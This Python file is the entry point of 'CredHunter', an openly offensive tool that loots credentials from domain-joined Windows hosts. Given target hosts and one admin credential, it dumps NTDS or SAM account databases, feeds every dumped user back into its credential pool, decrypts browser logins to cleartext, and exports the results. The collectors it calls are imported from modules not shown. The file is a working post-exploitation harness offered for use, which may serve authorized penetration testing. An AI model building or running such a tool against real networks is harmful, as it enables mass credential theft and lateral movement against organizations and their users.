#!/usr/bin/env python3
"""CredHunter - domain-joined Windows credential looter.

Feed every credential you already own; it runs the collectors against the
target(s), auto-decrypts what each credential can unlock (e.g. browser logins ->
cleartext), and prints one unified table. Raw tool output saved per host.

By default (autopool) it first dumps the account database on any host you are
admin on - NTDS (domain users) on a DC, local SAM on a member/standalone host -
and feeds every dumped user back into the credential pool, so every downstream
collector runs against all of them automatically. You only have to supply one
admin credential. Disable with --no-autopool to test ONLY the creds you passed.

Credential forms (--cred, repeatable, or --cred-file):
  DOMAIN/user:Password
  DOMAIN/user#<nthash>            (or #<lmhash>:<nthash>)
  DOMAIN/user%ccache:/path.ccache
  HOST=DOMAIN/user:Password       (bind a cred to one target only)
"""
from __future__ import annotations

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.credential import CredentialPool, parse_credential          # noqa: E402
from core.runner import run_all                                        # noqa: E402
from core import reporter                                              # noqa: E402
from core.tools import tool_status                                     # noqa: E402
from collectors import ALL_COLLECTORS, registry                        # noqa: E402


def build_args() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="CredHunter - unified Windows credential looter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__)
    p.add_argument("-t", "--target", action="append", default=[],
                   help="target host/IP (repeatable)")
    p.add_argument("--target-file", help="file with one target per line")
    p.add_argument("--cred", action="append", default=[],
                   help="credential, e.g. DOMAIN/user:pass or DOMAIN/user#nthash (repeatable)")
    p.add_argument("--cred-file", help="file with one credential per line")
    p.add_argument("-d", "--domain", default="", help="default domain for creds without one")
    p.add_argument("--local-auth", action="store_true",
                   help="treat credentials as local (SAM) accounts")
    p.add_argument("--no-autopool", action="store_true",
                   help="do NOT dump SAM/NTDS and feed the dumped users into the "
                        "pool; test only the credentials you supplied (default: "
                        "autopool enabled)")
    p.add_argument("-o", "--out", default="credhunter_loot",
                   help="output directory (raw output + exports)")
    p.add_argument("--json", action="store_true", help="export loot.json")
    p.add_argument("--csv", action="store_true", help="export loot.csv")
    p.add_argument("--only", help="comma list of collectors to run (see --list)")
    p.add_argument("--skip", help="comma list of collectors to skip")
    p.add_argument("--timeout", type=int, default=300, help="per-command timeout (s)")
    p.add_argument("--list", action="store_true", help="list collectors and exit")
    p.add_argument("-v", "--verbose", action="store_true")
    return p


def select_collectors(only: str, skip: str):
    chosen = list(ALL_COLLECTORS)
    if only:
        keys = {k.strip().lower() for k in only.split(",")}
        chosen = [c for c in chosen if c.name.lower().replace("/", "_") in keys]
    if skip:
        keys = {k.strip().lower() for k in skip.split(",")}
        chosen = [c for c in chosen if c.name.lower().replace("/", "_") not in keys]
    return chosen


def main() -> int:
    args = build_args().parse_args()
    reporter.print_banner()

    if args.list:
        print("Collectors (key -> description):")
        for c in ALL_COLLECTORS:
            key = c.name.lower().replace("/", "_")
            print(f"  {key:<12} {c.description}  [needs: {','.join(c.requires)}]")
        return 0

    ts = tool_status()
    print("[*] external tools:",
          ", ".join(f"{k}={'OK' if v else 'MISSING'}" for k, v in ts.items()),
          file=sys.stderr)

    targets = list(args.target)
    if args.target_file:
        with open(args.target_file) as fh:
            targets += [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    if not targets:
        print("[!] no targets (use -t / --target-file)", file=sys.stderr)
        return 2

    pool = CredentialPool()
    for c in args.cred:
        pool.add(parse_credential(c, args.domain, args.local_auth))
    if args.cred_file:
        for c in CredentialPool.from_file(args.cred_file, args.domain, args.local_auth):
            pool.add(c)
    if not pool:
        print("[!] no credentials (use --cred / --cred-file)", file=sys.stderr)
        return 2
    print(f"[*] {len(pool)} credential(s), {len(targets)} target(s)"
          f"{'' if args.no_autopool else ', autopool ON'}", file=sys.stderr)

    collectors = select_collectors(args.only, args.skip)
    secrets = run_all(targets, pool, collectors, args.out,
                      timeout=args.timeout, verbose=args.verbose,
                      autopool=not args.no_autopool)

    print()
    reporter.render_table(secrets)
    if args.json or args.csv:
        reporter.export(secrets, args.out, args.json, args.csv)
        print(f"\n[*] exports written under {args.out}/", file=sys.stderr)
    print(f"[*] raw tool output under {args.out}/raw/", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
